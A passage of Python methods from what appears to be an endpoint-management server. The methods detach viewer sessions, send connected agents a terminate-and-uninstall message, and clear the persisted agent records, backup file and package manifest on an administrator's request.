    def detach_viewer(self, agent_id: str, viewer_id: str, mode: str = "backstage"):
        agent = self.get_agent(agent_id)
        if agent:
            if mode == "mirror":
                session = agent.mirror_viewers.pop(viewer_id, None)
            else:
                session = agent.viewers.pop(viewer_id, None)
            if session and session.sender_task and not session.sender_task.done():
                session.sender_task.cancel()

    def remove_agent(self, agent_id: str) -> bool:
        """Removes an agent from registered and active lists and instructs target process to terminate cleanly."""
        self.decommissioned_agents.add(agent_id)
        if agent_id in self.active_agents:
            agent = self.active_agents.pop(agent_id)
            try:
                import asyncio
                async def terminate_and_close(ws):
                    try:
                        await ws.send_text(json.dumps({
                            "type": "terminate",
                            "reason": "Agent session removed and terminated by administrator",
                            "uninstall": True
                        }))
                        await asyncio.sleep(0.8)
                        await ws.close(code=1000, reason="Terminated by administrator")
                    except Exception:
                        pass
                asyncio.create_task(terminate_and_close(agent.ws))
            except Exception:
                pass
        if agent_id in self.registered_agents:
            self.registered_agents.pop(agent_id, None)
            if self.db_file and os.path.isfile(self.db_file):
                try:
                    with self._db_connection() as conn:
                        if conn:
                            conn.execute("DELETE FROM persisted_endpoints WHERE agent_id = ?", (agent_id,))
                            conn.commit()
                except Exception:
                    pass
            self._save_endpoints_to_disk()
            logger.info(f"Agent '{agent_id}' terminated and removed by administrator.")
            return True
        self._save_endpoints_to_disk()
        return False

    def remove_all_agents(self) -> int:
        """Removes and unbinds all agents (both active and registered offline) and wipes persistence."""
        all_ids = set(self.active_agents.keys()) | set(self.registered_agents.keys())
        count = len(all_ids)
        for aid in list(all_ids):
            self.remove_agent(aid)
        self.registered_agents.clear()
        self.pending_updates.clear()
        
        # Clear backup file on intentional wipe
        if self.backup_file and os.path.isfile(self.backup_file):
            try:
                with open(self.backup_file, "w", encoding="utf-8") as f:
                    json.dump({}, f)
            except Exception:
                pass

        # Clear SQLite store on intentional wipe
        if self.db_file and os.path.isfile(self.db_file):
            try:
                with self._db_connection() as conn:
                    if conn:
                        conn.execute("DELETE FROM persisted_endpoints")
                        conn.commit()
            except Exception:
                pass

        self._save_endpoints_to_disk()

        # Also wipe historical packages manifest so old test packages do not resurrect on reboot
        try:
            from .registry import MANIFEST_FILE
            if os.path.isfile(MANIFEST_FILE):
                with open(MANIFEST_FILE, "w", encoding="utf-8") as f:
                    json.dump({}, f, indent=2)
        except Exception as e:
            logger.warning(f"Could not wipe package manifest: {e}")

        logger.info(f"All {count} endpoints removed and unbound by administrator.")
        return count
